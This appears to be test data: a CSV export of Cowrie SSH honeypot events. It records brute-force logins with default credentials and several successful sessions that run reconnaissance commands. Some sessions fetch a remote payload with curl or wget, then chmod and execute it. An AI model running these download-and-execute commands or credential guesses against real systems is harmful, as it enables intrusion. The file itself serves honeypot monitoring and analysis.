eventid,message,sensor,uuid,timestamp,src_ip,src_port,dst_ip,dst_port,session,protocol,_source_file,version,username,password,input,ttylog,size,shasum,duplicate,duration,url,outfile,fingerprint,filename,destfile,command,is_command_input,is_command_failed,is_login_success,is_login_failed,is_session_closed,is_log_closed,is_file_download,is_file_upload
cowrie.log.closed,Closing TTY Log: var/lib/cowrie/tty/b91241e46754406f389d77638b711e3af003fcc9038febb077b0c2cb532cdd0f after 29.2 seconds,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:38:12.144371+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,,var/lib/cowrie/tty/b91241e46754406f389d77638b711e3af003fcc9038febb077b0c2cb532cdd0f,724.0,b91241e46754406f389d77638b711e3af003fcc9038febb077b0c2cb532cdd0f,False,29.2,,,,,,,0,0,0,0,0,1,0,0
cowrie.session.closed,Connection lost after 32.6 seconds,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:38:12.160101+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,,,,,,32.6,,,,,,,0,0,0,0,1,0,0,0
cowrie.session.connect,New connection: 185.220.101.45:41222 (10.0.0.5:2222),PC4Me,9888aa10-1649-11f1-8bf4-00155d923fee,2026-03-04 12:10:01+00:00,185.220.101.45,41222.0,10.0.0.5,2222.0,de9a441bb210,ssh,cowrieTEST.json,,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.client.version,Remote SSH version: SSH-2.0-libssh-0.8.3,PC4Me,9888aa10-1649-11f1-8bf4-00155d923fee,2026-03-04 12:10:01.400000+00:00,185.220.101.45,,10.0.0.5,2222.0,de9a441bb210,ssh,cowrieTEST.json,SSH-2.0-libssh-0.8.3,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.login.failed,login attempt [root/123456] failed,PC4Me,9888aa10-1649-11f1-8bf4-00155d923fee,2026-03-04 12:10:03+00:00,185.220.101.45,,10.0.0.5,2222.0,de9a441bb210,ssh,cowrieTEST.json,,root,123456,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.login.failed,login attempt [ubuntu/ubuntu] failed,PC4Me,9888aa10-1649-11f1-8bf4-00155d923fee,2026-03-04 12:10:04+00:00,185.220.101.45,,10.0.0.5,2222.0,de9a441bb210,ssh,cowrieTEST.json,,ubuntu,ubuntu,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.login.failed,login attempt [test/test] failed,PC4Me,9888aa10-1649-11f1-8bf4-00155d923fee,2026-03-04 12:10:05+00:00,185.220.101.45,,10.0.0.5,2222.0,de9a441bb210,ssh,cowrieTEST.json,,test,test,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.session.closed,Connection lost after 5.2 seconds,PC4Me,9888aa10-1649-11f1-8bf4-00155d923fee,2026-03-04 12:10:06.200000+00:00,185.220.101.45,,,,de9a441bb210,ssh,cowrieTEST.json,,,,,,,,,5.2,,,,,,,0,0,0,0,1,0,0,0
cowrie.session.connect,New connection: 45.83.64.12:60111 (10.0.0.5:2222),PC4Me,aa77bb20-1649-11f1-8bf4-00155d923fee,2026-03-04 12:40:10+00:00,45.83.64.12,60111.0,10.0.0.5,2222.0,77ca82f0e1ab,ssh,cowrieTEST.json,,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.client.version,Remote SSH version: SSH-2.0-Go,PC4Me,aa77bb20-1649-11f1-8bf4-00155d923fee,2026-03-04 12:40:10.400000+00:00,45.83.64.12,,10.0.0.5,2222.0,77ca82f0e1ab,ssh,cowrieTEST.json,SSH-2.0-Go,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.login.success,login attempt [admin/password] succeeded,PC4Me,aa77bb20-1649-11f1-8bf4-00155d923fee,2026-03-04 12:40:12+00:00,45.83.64.12,,10.0.0.5,2222.0,77ca82f0e1ab,ssh,cowrieTEST.json,,admin,password,,,,,,,,,,,,,0,0,1,0,0,0,0,0
cowrie.command.input,CMD: pwd,PC4Me,aa77bb20-1649-11f1-8bf4-00155d923fee,2026-03-04 12:40:13+00:00,45.83.64.12,,,,77ca82f0e1ab,ssh,cowrieTEST.json,,,,pwd,,,,,,,,,,,pwd,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: curl http://example.com/dropper.sh,PC4Me,aa77bb20-1649-11f1-8bf4-00155d923fee,2026-03-04 12:40:14.500000+00:00,45.83.64.12,,,,77ca82f0e1ab,ssh,cowrieTEST.json,,,,curl http://example.com/dropper.sh,,,,,,,,,,,curl http://example.com/dropper.sh,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: chmod +x dropper.sh,PC4Me,aa77bb20-1649-11f1-8bf4-00155d923fee,2026-03-04 12:40:15.200000+00:00,45.83.64.12,,,,77ca82f0e1ab,ssh,cowrieTEST.json,,,,chmod +x dropper.sh,,,,,,,,,,,chmod +x dropper.sh,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: ./dropper.sh,PC4Me,aa77bb20-1649-11f1-8bf4-00155d923fee,2026-03-04 12:40:16.200000+00:00,45.83.64.12,,,,77ca82f0e1ab,ssh,cowrieTEST.json,,,,./dropper.sh,,,,,,,,,,,./dropper.sh,1,0,0,0,0,0,0,0
cowrie.command.failed,Command not found: ./dropper.sh,PC4Me,aa77bb20-1649-11f1-8bf4-00155d923fee,2026-03-04 12:40:16.300000+00:00,45.83.64.12,,,,77ca82f0e1ab,ssh,cowrieTEST.json,,,,./dropper.sh,,,,,,,,,,,./dropper.sh,0,1,0,0,0,0,0,0
cowrie.log.closed,Closing TTY Log: var/lib/cowrie/tty/77ca82f0e1ab.log after 8.3 seconds,PC4Me,aa77bb20-1649-11f1-8bf4-00155d923fee,2026-03-04 12:40:18.100000+00:00,45.83.64.12,,,,77ca82f0e1ab,ssh,cowrieTEST.json,,,,,var/lib/cowrie/tty/77ca82f0e1ab.log,981.0,16b98cfb4a6c0b77f4f2f907f16a22b4cbd1a111,False,8.3,,,,,,,0,0,0,0,0,1,0,0
cowrie.session.closed,Connection lost after 8.5 seconds,PC4Me,aa77bb20-1649-11f1-8bf4-00155d923fee,2026-03-04 12:40:18.500000+00:00,45.83.64.12,,,,77ca82f0e1ab,ssh,cowrieTEST.json,,,,,,,,,8.5,,,,,,,0,0,0,0,1,0,0,0
cowrie.session.connect,New connection: 91.92.109.12:53310 (10.0.0.5:2222),PC4Me,bb88cc30-1649-11f1-8bf4-00155d923fee,2026-03-04 13:05:01+00:00,91.92.109.12,53310.0,10.0.0.5,2222.0,19ddfa08ac44,ssh,cowrieTEST.json,,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.client.version,Remote SSH version: SSH-2.0-paramiko_2.11.0,PC4Me,bb88cc30-1649-11f1-8bf4-00155d923fee,2026-03-04 13:05:01.300000+00:00,91.92.109.12,,10.0.0.5,2222.0,19ddfa08ac44,ssh,cowrieTEST.json,SSH-2.0-paramiko_2.11.0,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.login.failed,login attempt [root/toor] failed,PC4Me,bb88cc30-1649-11f1-8bf4-00155d923fee,2026-03-04 13:05:02+00:00,91.92.109.12,,10.0.0.5,2222.0,19ddfa08ac44,ssh,cowrieTEST.json,,root,toor,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.login.failed,login attempt [oracle/oracle] failed,PC4Me,bb88cc30-1649-11f1-8bf4-00155d923fee,2026-03-04 13:05:02.900000+00:00,91.92.109.12,,10.0.0.5,2222.0,19ddfa08ac44,ssh,cowrieTEST.json,,oracle,oracle,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.login.failed,login attempt [pi/raspberry] failed,PC4Me,bb88cc30-1649-11f1-8bf4-00155d923fee,2026-03-04 13:05:03.800000+00:00,91.92.109.12,,10.0.0.5,2222.0,19ddfa08ac44,ssh,cowrieTEST.json,,pi,raspberry,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.session.closed,Connection lost after 3.5 seconds,PC4Me,bb88cc30-1649-11f1-8bf4-00155d923fee,2026-03-04 13:05:04.500000+00:00,91.92.109.12,,,,19ddfa08ac44,ssh,cowrieTEST.json,,,,,,,,,3.5,,,,,,,0,0,0,0,1,0,0,0
cowrie.session.connect,New connection: 203.0.113.77:49881 (10.0.0.5:2222),PC4Me,cc99dd40-1649-11f1-8bf4-00155d923fee,2026-03-04 13:21:10+00:00,203.0.113.77,49881.0,10.0.0.5,2222.0,c1a2bb7fd932,ssh,cowrieTEST.json,,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.client.version,Remote SSH version: SSH-2.0-PuTTY_Release_0.76,PC4Me,cc99dd40-1649-11f1-8bf4-00155d923fee,2026-03-04 13:21:10.400000+00:00,203.0.113.77,,10.0.0.5,2222.0,c1a2bb7fd932,ssh,cowrieTEST.json,SSH-2.0-PuTTY_Release_0.76,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.login.success,login attempt [service/service] succeeded,PC4Me,cc99dd40-1649-11f1-8bf4-00155d923fee,2026-03-04 13:21:12.100000+00:00,203.0.113.77,,10.0.0.5,2222.0,c1a2bb7fd932,ssh,cowrieTEST.json,,service,service,,,,,,,,,,,,,0,0,1,0,0,0,0,0
cowrie.command.input,CMD: id,PC4Me,cc99dd40-1649-11f1-8bf4-00155d923fee,2026-03-04 13:21:13+00:00,203.0.113.77,,,,c1a2bb7fd932,ssh,cowrieTEST.json,,,,id,,,,,,,,,,,id,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: uname -r,PC4Me,cc99dd40-1649-11f1-8bf4-00155d923fee,2026-03-04 13:21:13.500000+00:00,203.0.113.77,,,,c1a2bb7fd932,ssh,cowrieTEST.json,,,,uname -r,,,,,,,,,,,uname -r,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: wget http://198.51.100.10/bins/mips,PC4Me,cc99dd40-1649-11f1-8bf4-00155d923fee,2026-03-04 13:21:15.100000+00:00,203.0.113.77,,,,c1a2bb7fd932,ssh,cowrieTEST.json,,,,wget http://198.51.100.10/bins/mips,,,,,,,,,,,wget http://198.51.100.10/bins/mips,1,0,0,0,0,0,0,0
cowrie.session.file_download,Saved http://198.51.100.10/bins/mips to var/lib/cowrie/downloads/8f14e45fceea167a5a36dedd4bea2543,PC4Me,cc99dd40-1649-11f1-8bf4-00155d923fee,2026-03-04 13:21:16.200000+00:00,203.0.113.77,,,,c1a2bb7fd932,ssh,cowrieTEST.json,,,,,,,8f14e45fceea167a5a36dedd4bea2543,,,http://198.51.100.10/bins/mips,var/lib/cowrie/downloads/8f14e45fceea167a5a36dedd4bea2543,,,,,0,0,0,0,0,0,1,0
cowrie.log.closed,Closing TTY Log: var/lib/cowrie/tty/c1a2bb7fd932.log after 7.8 seconds,PC4Me,cc99dd40-1649-11f1-8bf4-00155d923fee,2026-03-04 13:21:18+00:00,203.0.113.77,,,,c1a2bb7fd932,ssh,cowrieTEST.json,,,,,var/lib/cowrie/tty/c1a2bb7fd932.log,654.0,9d5ed678fe57bcca610140957afab571,False,7.8,,,,,,,0,0,0,0,0,1,0,0
cowrie.session.closed,Connection lost after 8.0 seconds,PC4Me,cc99dd40-1649-11f1-8bf4-00155d923fee,2026-03-04 13:21:18.100000+00:00,203.0.113.77,,,,c1a2bb7fd932,ssh,cowrieTEST.json,,,,,,,,,8.0,,,,,,,0,0,0,0,1,0,0,0
cowrie.session.connect,New connection: 198.51.100.24:37771 (10.0.0.5:2222),PC4Me,dd10ee50-1649-11f1-8bf4-00155d923fee,2026-03-04 13:44:00+00:00,198.51.100.24,37771.0,10.0.0.5,2222.0,e55f0a4bb761,ssh,cowrieTEST.json,,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.client.version,Remote SSH version: SSH-2.0-libssh2_1.10.0,PC4Me,dd10ee50-1649-11f1-8bf4-00155d923fee,2026-03-04 13:44:00.300000+00:00,198.51.100.24,,10.0.0.5,2222.0,e55f0a4bb761,ssh,cowrieTEST.json,SSH-2.0-libssh2_1.10.0,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.login.failed,login attempt [support/support] failed,PC4Me,dd10ee50-1649-11f1-8bf4-00155d923fee,2026-03-04 13:44:01.100000+00:00,198.51.100.24,,10.0.0.5,2222.0,e55f0a4bb761,ssh,cowrieTEST.json,,support,support,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.session.closed,Connection lost after 1.6 seconds,PC4Me,dd10ee50-1649-11f1-8bf4-00155d923fee,2026-03-04 13:44:01.600000+00:00,198.51.100.24,,,,e55f0a4bb761,ssh,cowrieTEST.json,,,,,,,,,1.6,,,,,,,0,0,0,0,1,0,0,0
cowrie.session.connect,New connection: 103.245.12.44:45411 (10.0.0.5:2222),PC4Me,ee11ff60-1649-11f1-8bf4-00155d923fee,2026-03-04 14:00:01+00:00,103.245.12.44,45411.0,10.0.0.5,2222.0,fa12b4470c10,ssh,cowrieTEST.json,,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.client.version,Remote SSH version: SSH-2.0-libssh-0.7.6,PC4Me,ee11ff60-1649-11f1-8bf4-00155d923fee,2026-03-04 14:00:01.300000+00:00,103.245.12.44,,10.0.0.5,2222.0,fa12b4470c10,ssh,cowrieTEST.json,SSH-2.0-libssh-0.7.6,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.login.failed,login attempt [root/root123] failed,PC4Me,ee11ff60-1649-11f1-8bf4-00155d923fee,2026-03-04 14:00:02+00:00,103.245.12.44,,10.0.0.5,2222.0,fa12b4470c10,ssh,cowrieTEST.json,,root,root123,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.login.failed,login attempt [admin/123123] failed,PC4Me,ee11ff60-1649-11f1-8bf4-00155d923fee,2026-03-04 14:00:02.800000+00:00,103.245.12.44,,10.0.0.5,2222.0,fa12b4470c10,ssh,cowrieTEST.json,,admin,123123,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.login.failed,login attempt [user/password1] failed,PC4Me,ee11ff60-1649-11f1-8bf4-00155d923fee,2026-03-04 14:00:03.600000+00:00,103.245.12.44,,10.0.0.5,2222.0,fa12b4470c10,ssh,cowrieTEST.json,,user,password1,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.login.failed,login attempt [guest/guest123] failed,PC4Me,ee11ff60-1649-11f1-8bf4-00155d923fee,2026-03-04 14:00:04.200000+00:00,103.245.12.44,,10.0.0.5,2222.0,fa12b4470c10,ssh,cowrieTEST.json,,guest,guest123,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.session.closed,Connection lost after 4.1 seconds,PC4Me,ee11ff60-1649-11f1-8bf4-00155d923fee,2026-03-04 14:00:05.100000+00:00,103.245.12.44,,,,fa12b4470c10,ssh,cowrieTEST.json,,,,,,,,,4.1,,,,,,,0,0,0,0,1,0,0,0
cowrie.session.connect,New connection: 172.104.18.91:39211 (10.0.0.5:2222),PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:10+00:00,172.104.18.91,39211.0,10.0.0.5,2222.0,7c99d0af04c1,ssh,cowrieTEST.json,,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.client.version,Remote SSH version: SSH-2.0-OpenSSH_7.4,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:10.400000+00:00,172.104.18.91,,10.0.0.5,2222.0,7c99d0af04c1,ssh,cowrieTEST.json,SSH-2.0-OpenSSH_7.4,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.client.fingerprint,Client public key fingerprint: 3b:77:13:8e:1a:71:90:fa:55:66:11:22:33:44:55:66,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:10.800000+00:00,172.104.18.91,,,,7c99d0af04c1,ssh,cowrieTEST.json,,,,,,,,,,,,3b:77:13:8e:1a:71:90:fa:55:66:11:22:33:44:55:66,,,,0,0,0,0,0,0,0,0
cowrie.login.success,login attempt [operator/operator] succeeded,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:12.100000+00:00,172.104.18.91,,10.0.0.5,2222.0,7c99d0af04c1,ssh,cowrieTEST.json,,operator,operator,,,,,,,,,,,,,0,0,1,0,0,0,0,0
cowrie.command.input,CMD: pwd,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:13+00:00,172.104.18.91,,,,7c99d0af04c1,ssh,cowrieTEST.json,,,,pwd,,,,,,,,,,,pwd,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: uname -a,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:13.600000+00:00,172.104.18.91,,,,7c99d0af04c1,ssh,cowrieTEST.json,,,,uname -a,,,,,,,,,,,uname -a,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: id,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:14.100000+00:00,172.104.18.91,,,,7c99d0af04c1,ssh,cowrieTEST.json,,,,id,,,,,,,,,,,id,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: wget http://203.0.113.200/tools/arm7,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:15.700000+00:00,172.104.18.91,,,,7c99d0af04c1,ssh,cowrieTEST.json,,,,wget http://203.0.113.200/tools/arm7,,,,,,,,,,,wget http://203.0.113.200/tools/arm7,1,0,0,0,0,0,0,0
cowrie.session.file_download,Saved http://203.0.113.200/tools/arm7 to var/lib/cowrie/downloads/1f3870be274f6c49b3e31a0c6728957f,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:16.500000+00:00,172.104.18.91,,,,7c99d0af04c1,ssh,cowrieTEST.json,,,,,,,1f3870be274f6c49b3e31a0c6728957f,,,http://203.0.113.200/tools/arm7,var/lib/cowrie/downloads/1f3870be274f6c49b3e31a0c6728957f,,,,,0,0,0,0,0,0,1,0
cowrie.command.input,CMD: chmod +x arm7,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:17.100000+00:00,172.104.18.91,,,,7c99d0af04c1,ssh,cowrieTEST.json,,,,chmod +x arm7,,,,,,,,,,,chmod +x arm7,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: ./arm7,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:17.900000+00:00,172.104.18.91,,,,7c99d0af04c1,ssh,cowrieTEST.json,,,,./arm7,,,,,,,,,,,./arm7,1,0,0,0,0,0,0,0
cowrie.command.failed,Command not found: ./arm7,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:18+00:00,172.104.18.91,,,,7c99d0af04c1,ssh,cowrieTEST.json,,,,./arm7,,,,,,,,,,,./arm7,0,1,0,0,0,0,0,0
cowrie.session.file_upload,Uploaded file loot.txt to var/lib/cowrie/uploads/7c99d0af04c1_loot.txt,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:19.200000+00:00,172.104.18.91,,,,7c99d0af04c1,ssh,cowrieTEST.json,,,,,,,4a7d1ed414474e4033ac29ccb8653d9b,,,,var/lib/cowrie/uploads/7c99d0af04c1_loot.txt,,loot.txt,,,0,0,0,0,0,0,0,1
cowrie.log.closed,Closing TTY Log: var/lib/cowrie/tty/7c99d0af04c1.log after 10.9 seconds,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:20.900000+00:00,172.104.18.91,,,,7c99d0af04c1,ssh,cowrieTEST.json,,,,,var/lib/cowrie/tty/7c99d0af04c1.log,1102.0,c4ca4238a0b923820dcc509a6f75849b,False,10.9,,,,,,,0,0,0,0,0,1,0,0
cowrie.session.closed,Connection lost after 11.2 seconds,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,2026-03-04 14:12:21.200000+00:00,172.104.18.91,,,,7c99d0af04c1,ssh,cowrieTEST.json,,,,,,,,,11.2,,,,,,,0,0,0,0,1,0,0,0
cowrie.session.connect,New connection: 198.18.0.77:34567 (10.0.0.5:2222),PC4Me,ab33bc80-1649-11f1-8bf4-00155d923fee,2026-03-04 14:28:00+00:00,198.18.0.77,34567.0,10.0.0.5,2222.0,2f8ab194d0e8,ssh,cowrieTEST.json,,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.client.version,Remote SSH version: SSH-2.0-dropbear_2019.78,PC4Me,ab33bc80-1649-11f1-8bf4-00155d923fee,2026-03-04 14:28:00.300000+00:00,198.18.0.77,,10.0.0.5,2222.0,2f8ab194d0e8,ssh,cowrieTEST.json,SSH-2.0-dropbear_2019.78,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.login.failed,login attempt [test/1234] failed,PC4Me,ab33bc80-1649-11f1-8bf4-00155d923fee,2026-03-04 14:28:01.100000+00:00,198.18.0.77,,10.0.0.5,2222.0,2f8ab194d0e8,ssh,cowrieTEST.json,,test,1234,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.login.failed,login attempt [root/admin] failed,PC4Me,ab33bc80-1649-11f1-8bf4-00155d923fee,2026-03-04 14:28:02+00:00,198.18.0.77,,10.0.0.5,2222.0,2f8ab194d0e8,ssh,cowrieTEST.json,,root,admin,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.direct-tcpip.request,direct-tcpip request: 198.18.0.77:8080,PC4Me,ab33bc80-1649-11f1-8bf4-00155d923fee,2026-03-04 14:28:02.700000+00:00,198.18.0.77,,,,2f8ab194d0e8,ssh,cowrieTEST.json,,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.session.closed,Connection lost after 3.0 seconds,PC4Me,ab33bc80-1649-11f1-8bf4-00155d923fee,2026-03-04 14:28:03+00:00,198.18.0.77,,,,2f8ab194d0e8,ssh,cowrieTEST.json,,,,,,,,,3.0,,,,,,,0,0,0,0,1,0,0,0
cowrie.session.connect,New connection: 66.240.219.146:52220 (10.0.0.5:2222),PC4Me,bc44cd90-1649-11f1-8bf4-00155d923fee,2026-03-04 14:40:30+00:00,66.240.219.146,52220.0,10.0.0.5,2222.0,5e7f9d0aa131,ssh,cowrieTEST.json,,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
